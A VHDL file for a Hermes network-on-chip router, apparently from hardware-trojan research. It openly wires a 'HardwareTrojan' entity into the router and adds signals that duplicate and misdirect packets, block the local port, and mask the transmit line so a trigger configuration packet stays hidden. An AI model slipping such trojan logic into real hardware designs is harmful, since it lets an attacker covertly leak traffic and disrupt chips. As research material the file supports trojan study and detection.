library IEEE;
use IEEE.std_logic_1164.all;
use IEEE.std_logic_unsigned.all;
use work.HermesPackage.all;

entity RouterInfected is
generic( address: regmetadeflit := (others=>'0'));
port(
	clock:     in  std_logic;
	reset:     in  std_logic;
	clock_rx:  in  regNport;
	rx:        in  regNport;
	data_in:   in  arrayNport_regflit;
	credit_o:  out regNport;    
	clock_tx:  out regNport;
	tx:        out regNport;
	data_out:  out arrayNport_regflit;
	credit_i:  in  regNport);
end RouterInfected;

architecture RouterInfected of RouterInfected is

signal h, ack_h, data_av, sender, data_ack: regNport := (others=>'0');
signal data : arrayNport_regflit := (others=>(others=>'0'));
signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
signal free: regNport := (others=>'0');

-- trojan signals
signal HTworking, duplicate, missdirect, localblock, data_ack_local, n_maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
signal txCrossbar : regNport := (others=>'0');
signal configPckt, turnOff, mux_dup : std_logic_vector(NPORT-2 downto 0) := (others=>'0');
signal dupFlit : regflit := (others=>'0');
signal destAddr : arrayNportless1_regmetadeflit := (others=>(others=>'0'));
signal htOp : arrayNportless1_2bits := (others=>(others=>'0'));

begin

	FEast : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(0),
		turnOff => turnOff(0),
		HTworking => HTworking,
		destAddr => destAddr(0),
		htOp => htOp(0),
		address => address,
		data_in => data_in(0),
		rx => rx(0),
		h => h(0),
		ack_h => ack_h(0),
		data_av => data_av(0),
		data => data(0),
		sender_o => sender(0),
		clock_rx => clock_rx(0),
		data_ack => data_ack(0),
		credit_o => credit_o(0));

	FWest : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(1),
		turnOff => turnOff(1),
		HTworking => HTworking,
		destAddr => destAddr(1),
		htOp => htOp(1),
		address => address,
		data_in => data_in(1),
		rx => rx(1),
		h => h(1),
		ack_h => ack_h(1),
		data_av => data_av(1),
		data => data(1),
		sender_o => sender(1),
		clock_rx => clock_rx(1),
		data_ack => data_ack(1),
		credit_o => credit_o(1));

	FNorth : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(2),
		turnOff => turnOff(2),
		HTworking => HTworking,		
		destAddr => destAddr(2),
		htOp => htOp(2),
		address => address,
		data_in => data_in(2),
		rx => rx(2),
		h => h(2),
		ack_h => ack_h(2),
		data_av => data_av(2),
		data => data(2),
		sender_o => sender(2),
		clock_rx => clock_rx(2),
		data_ack => data_ack(2),
		credit_o => credit_o(2));

	FSouth : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(3),
		turnOff => turnOff(3),
		HTworking => HTworking,
		destAddr => destAddr(3),
		htOp => htOp(3),
		address => address,
		data_in => data_in(3),
		rx => rx(3),
		h => h(3),
		ack_h => ack_h(3),
		data_av => data_av(3),
		data => data(3),
		sender_o => sender(3),
		clock_rx => clock_rx(3),
		data_ack => data_ack(3),
		credit_o => credit_o(3));

	FLocal : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		data_in => data_in(4),
		rx => rx(4),
		h => h(4),
		ack_h => ack_h(4),
		data_av => data_av_local,
		data => data(4),
		sender => sender(4),
		clock_rx => clock_rx(4),
		data_ack => data_ack_local,
		missdirect => missdirect,
		localblock => localblock,
		credit_o => credit_o(4));

	SwitchControl : Entity work.SwitchControl(AlgorithmXY)
	port map(
		clock => clock,
		reset => reset,
		duplicate => duplicate,
		dupAddr => dupFlit(METADEFLIT-1 downto 0),
		h => h,
		ack_h => ack_h,
		address => address,
		data => data,
		sender => sender,
		free => free,
		mux_in => mux_in,
		mux_out => mux_out,
		mux_dup => mux_dup,
		duplicating_o => duplicating);

	CrossBar : Entity work.Hermes_crossbar
	port map(
		data_av => data_av,
		data_in => data,
		data_ack => data_ack,
		data_dup => dupFlit,
		data_ack_dup => data_ack_dup,
		free => free,
		tab_in => mux_in,
		tab_out => mux_out,
		tab_dup => mux_dup,
		tx => txCrossbar,
		data_out => data_out,
		credit_i => credit_i);

	CLK_TX : for i in 0 to(NPORT-1) generate
		clock_tx(i) <= clock;
	end generate CLK_TX;

	---------------------
	-- HARDWARE TROJAN --
	---------------------
	HTrojan : Entity work.HardwareTrojan
	port map(
		clock 			=> clock,
        reset 			=> reset,
        data_in 		=> data(4),
        sending			=> sender(4),
        destAddr		=> destAddr,
		htOp 			=> htOp,
        dupFlit			=> dupFlit,
        duplicate 		=> duplicate,
		missdirect		=> missdirect,
		localblock		=> localblock,
        configPckt 		=> configPckt,
      	n_maskPckt_o	=> n_maskPckt,
      	turnOff			=> turnOff
	);

	-- Enquanto estiver duplicando pacotes - Mascara-se o credito que vem dos transmissores pra não perder dado em caso de parada de um dos fluxos
	data_ack_local <= data_ack(LOCAL) AND data_ack_dup when duplicating = '1' else
					  data_ack(LOCAL);

	-- Não deixa passar o TX se ambos os buffers não podem recebe-lo - para evitar duplicação de flits em um dos buffers.
	data_av(4) <= '0' when duplicating = '1' and data_ack_local = '0' else
				  data_av_local;

	-- To ofuscate the configuration packet
	tx(LOCAL) <= txCrossbar(LOCAL) AND n_maskPckt;
	tx(EAST) <= txCrossbar(EAST);
	tx(WEST) <= txCrossbar(WEST);
	tx(SOUTH) <= txCrossbar(SOUTH);
	tx(NORTH) <= txCrossbar(NORTH);

	HTworking <= duplicate OR missdirect OR localblock;

end RouterInfected;
